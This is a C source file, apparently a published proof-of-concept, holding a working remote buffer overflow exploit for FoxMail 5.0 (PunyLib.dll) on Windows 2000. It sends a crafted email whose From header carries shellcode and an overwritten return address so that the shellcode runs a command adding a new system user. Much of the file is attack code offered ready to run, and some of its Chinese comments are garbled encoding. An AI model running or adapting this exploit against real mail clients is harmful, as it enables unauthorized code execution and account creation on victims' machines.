/*
 *适用系统:windows 2000 sp2
 *使用软件版本:foxmail 5.0.120.0(5.0 bate1)
 *功能:向foxmail 发送一封非法邮件，并且在系统上新建一个系统用户w
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib, "ws2_32")
#include <errno.h>

#define MAX_NUM 2
#define clear(p) ZeroMemory(p, sizeof(p));

//---------------------------------------------------------------------------
//  4bit binary to char 0-F
char Hex2Chr(unsigned char n) {
  n &= 0xF;
  if (n < 10)
    return (char)(n + '0');
  else
    return (char)(n - 10 + 'A');
}
//---------------------------------------------------------------------------
//  char 0-F to 4bit binary
unsigned char Chr2Hex(char c) {
  if (c >= 'a' && c <= 'z') //  it's toupper
    c = c - 'a' + 'A';
  if (c >= '0' && c <= '9')
    return (int)(c - '0');
  else if (c >= 'A' && c <= 'F')
    return (int)(c - 'A' + 10);
  else
    return -1;
}
//---------------------------------------------------------------------------
//  Base64 code table
//  0-63 : A-Z(25) a-z(51), 0-9(61), +(62), /(63)
char Base2Chr(unsigned char n) {
  n &= 0x3F;
  if (n < 26)
    return (char)(n + 'A');
  else if (n < 52)
    return (char)(n - 26 + 'a');
  else if (n < 62)
    return (char)(n - 52 + '0');
  else if (n == 62)
    return '+';
  else
    return '/';
}
//---------------------------------------------------------------------------
unsigned char Chr2Base(char c) {
  if (c >= 'A' && c <= 'Z')
    return (unsigned char)(c - 'A');
  else if (c >= 'a' && c <= 'z')
    return (unsigned char)(c - 'a' + 26);
  else if (c >= '0' && c <= '9')
    return (unsigned char)(c - '0' + 52);
  else if (c == '+')
    return 62;
  else if (c == '/')
    return 63;
  else
    return 64; //  ��Ч�ַ�
}
//---------------------------------------------------------------------------
//  aLen Ϊ aSrc �Ĵ�С�� aDest ��ָ�Ļ�������������Ϊ aLen �� 3 ��������
//  ���� aDest �ĳ���
int QPEncode(char *const aDest, const unsigned char *aSrc, int aLen) {
  char *p = aDest;
  int i = 0;

  while (i++ < aLen) {
    *p++ = '=';
    *p++ = Hex2Chr(*aSrc >> 4);
    *p++ = Hex2Chr(*aSrc++);
  }
  *p = 0;             //  aDest is an ASCIIZ string
  return (p - aDest); //  exclude the end of zero
}
//---------------------------------------------------------------------------
//  aDest ��ָ�Ļ�������������Ϊ aSrc ���ȵ� 1/3 ������
//  ���� aDest �ĳ���
int QPDecode(unsigned char *const aDest, const char *aSrc) {
  unsigned char *p = aDest;
  int n = strlen(aSrc);
  unsigned char ch, cl;

  while (*aSrc) //  aSrc is an ASCIIZ string
  {
    if ((*aSrc == '=') && (n - 2 > 0)) {
      ch = Chr2Hex(aSrc[1]);
      cl = Chr2Hex(aSrc[2]);
      if ((ch == (unsigned char)-1) || (cl == (unsigned char)-1))
        *p++ = *aSrc++;
      else {
        *p++ = (ch << 4) | cl;
        aSrc += 3;
      }
    } else
      *p++ = *aSrc++;
  }
  return (p - aDest);
}
//---------------------------------------------------------------------------
//  aLen Ϊ aSrc �ĳ��ȣ� aDest ��ָ�Ļ�������������Ϊ aLen �� 4/3 ��������
//  ���� aDest �ĳ���
int Base64Encode(char *const aDest, const unsigned char *aSrc, int aLen) {
  char *p = aDest;
  int i;
  unsigned char t;

  for (i = 0; i < aLen; i++) {
    switch (i % 3) {
    case 0:
      *p++ = Base2Chr(*aSrc >> 2);
      t = (*aSrc++ << 4) & 0x3F;
      break;
    case 1:
      *p++ = Base2Chr(t | (*aSrc >> 4));
      t = (*aSrc++ << 2) & 0x3F;
      break;
    case 2:
      *p++ = Base2Chr(t | (*aSrc >> 6));
      *p++ = Base2Chr(*aSrc++);
      break;
    }
  }
  if (aLen % 3 != 0) {
    *p++ = Base2Chr(t);
    if (aLen % 3 == 1)
      *p++ = '=';
    *p++ = '=';
  }
  *p = 0;             //  aDest is an ASCIIZ string
  return (p - aDest); //  exclude the end of zero
}
//---------------------------------------------------------------------------
//  aDest ��ָ�Ļ�������������Ϊ aSrc ���ȵ� 0.75 ��������
//  ���� aDest �ĳ���
int Base64Decode(unsigned char *const aDest, const char *aSrc) {
  unsigned char *p = aDest;
  int i, n = strlen(aSrc);
  unsigned char c, t;

  for (i = 0; i < n; i++) {
    if (*aSrc == '=')
      break;
    do {
      if (*aSrc)
        c = Chr2Base(*aSrc++);
      else
        c = 65;        //  �ַ�������
    } while (c == 64); //  ������Ч�ַ�����س���
    if (c == 65)
      break;
    switch (i % 4) {
    case 0:
      t = c << 2;
      break;
    case 1:
      *p++ = (unsigned char)(t | (c >> 4));
      t = (unsigned char)(c << 4);
      break;
    case 2:
      *p++ = (unsigned char)(t | (c >> 2));
      t = (unsigned char)(c << 6);
      break;
    case 3:
      *p++ = (unsigned char)(t | c);
      break;
    }
  }
  return (p - aDest);
}

unsigned int id = 0;
unsigned short port = 0;
char *smtpaddr = NULL, *shellHost = NULL;

int new_tcpConnect(char *address, int port, int timeout) {
  struct sockaddr_in target;
  SOCKET s;
  int i;
  DWORD bf;
  fd_set wd;
  struct timeval tv;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return -1;

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(address);
  if (target.sin_addr.s_addr == 0) {
    closesocket(s);
    return -2;
  }
  target.sin_port = htons(port);
  bf = 1;
  ioctlsocket(s, FIONBIO, &bf);
  tv.tv_sec = timeout;
  tv.tv_usec = 0;
  FD_ZERO(&wd);
  FD_SET(s, &wd);
  connect(s, (struct sockaddr *)&target, sizeof(target));
  if ((i = select(s + 1, 0, &wd, 0, &tv)) == (-1)) {
    closesocket(s);
    return -3;
  }
  if (i == 0) {
    closesocket(s);
    return -4;
  }
  i = sizeof(int);
  getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&bf, &i);
  if ((bf != 0) || (i != sizeof(int))) {
    closesocket(s);
    return -5;
  }
  ioctlsocket(s, FIONBIO, &bf);
  return s;
}

/* smtp messages
 *
 */
void replay(int sock, int response) {
  char temp[4096];

  clear(temp);
  if (recv(sock, temp, sizeof(temp), 0) <= 0) {
    printf("Error reading from socket\n");
    exit(0);
  }
  if (response != atol(temp)) {
    printf("Bad response: %s\n", temp);
    exit(0);
  }
  printf("%s\n", temp);
}

/* ceate evil E-mail.
 * and send.
 */
int send_evilmail(char *mailaddr) {
  int i;
  int sock;
  int ret;
  char buffer[1000], temp[4096];
  char msg[512];

  WSADATA ws;

  char ShellCode[] =
      "\x8B\xE5\x55\x8B\xEC\x33\xFF\x57\x57\x57\x57\xC7\x45\xF1\x6E\x65"
      "\x74\x20\xC7\x45\xF5\x75\x73\x65\x72\xC7\x45\xF9\x20\x77\x20\x2E"
      "\x80\x45\xFC\x01\xC6\x45\xFD\x61\xC6\x45\xFE\x64\x33\xC0\x88\x45"
      "\xFF\x8D\x45\xF1\x50\xB8\x4A\x9B\x01\x78\xFF\xD0";
  if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) {
    printf("WSAStartup failed.\n");
    WSACleanup();
    exit(1);
  }
  // �����ʼ�������
  if ((sock = new_tcpConnect(smtpaddr, 25, 4000)) <= 0) {
    perror("new_tcpConnect");
    exit(0);
  }

  /* smtp auths */
  fprintf(stderr, "# smtp authentication .\n ");
  replay(sock, 220);

  clear(temp);
  ret = send(sock, "EHLO server\r\n", strlen("EHLO server\r\n"), 0);
  replay(sock, 250);
  /*
                  clear (temp);
                  ret=send(sock, "AUTH LOGIN\r\n",strlen("AUTH LOGIN\r\n"), 0);
                  replay (sock, 334);
                  //�û���
                  clear (temp);
                  ret = Base64Encode(msg, (const unsigned char *)"ww0830",
     strlen("ww0830")); msg[ret] = 0; lstrcat(msg, "\r\n"); ret=send(sock, msg,
     strlen(msg), 0); replay (sock, 334);
                  //������֤
                  clear (temp);
                  ret = Base64Encode(msg, (const unsigned char *)"12345!@#$%",
     strlen("12345!@#$%")); msg[ret] = 0; lstrcat(msg, "\r\n"); ret=send(sock,
     msg, strlen(msg), 0); replay (sock, 235);
                  */

  // ���͵�ַ
  clear(temp);
  ret = send(sock, "MAIL FROM: <mail1@test.com>\r\n",
             strlen("MAIL FROM: <mail1@test.com>\r\n"), 0);
  replay(sock, 250);
  // ���յ�ַ
  clear(temp);
  sprintf(temp, "RCPT TO: <%s>\r\n", mailaddr);
  ret = send(sock, temp, strlen(temp), 0);
  replay(sock, 250);
  // ����
  clear(temp);
  ret = send(sock, "DATA\r\n", strlen("DATA\r\n"), 0);
  replay(sock, 354);

  fprintf(stderr, "# send evil E-mail . \n");
  // ���춨�㣡��������������������������������������������
  clear(temp);
  clear(buffer);

  memset(buffer, 'A', 0x104);
  memcpy(buffer + 190, ShellCode, sizeof(ShellCode) - 1);
  buffer[256] = '\x64';
  buffer[257] = '\xaf';
  buffer[258] = '\xe1';
  buffer[259] = '\x77';

  buffer[260] = '\xEb';
  buffer[261] = '\x80';

  sprintf(temp, "From: %s\r\n", buffer);

  send(sock, temp, strlen(temp), 0);
  // ������������������������������������������������������
  clear(temp);
  sprintf(temp, ".\r\nquit\r\n");
  send(sock, temp, strlen(temp), 0);

  fprintf(stderr, "# waiting client receive mail. \n\n");
  closesocket(sock);

  return 0;
}

void showHELP(char *p) {

  fprintf(stderr,
          "Usage %s [smtp address] <attack mail address> <server ip> <server "
          "port> <target type>\n\n",
          p);
  fprintf(stderr,
          "server ip / port: shellcode server's ip address and port\n\n");
  printf("Targets: \n");
  printf("num . description\n");
  printf("----+-----------------------------------------------"
         "--------\n");

  printf("    '\n");
  return;
}

int main(int argc, char *argv[]) {
  char *mail;

  fprintf(stderr, "FoxMail 5.0 PunyLib.dll Remote Buffer Overflow exploit by "
                  "Sam (Sam#0x557.org)\n\n");
  if (argc != 6) {
    showHELP(argv[0]);
    exit(0);
  }

  smtpaddr = argv[1];
  mail = argv[2];
  shellHost = argv[3];
  port = atoi(argv[4]);
  id = atoi(argv[5]);
  if (id > MAX_NUM || id < 0) {
    printf("wtf your input");
    exit(0);
  }

  fprintf(stderr, "[*] use smtp server: %s \n", smtpaddr);
  fprintf(stderr, "[*] attack E-mail address: %s \n", mail);
  fprintf(stderr, "[*] shellcode server address: %s \n", shellHost);
  fprintf(stderr, "[*] shellcode server port: %d \n", port);

  send_evilmail(mail);

  return 0;
}
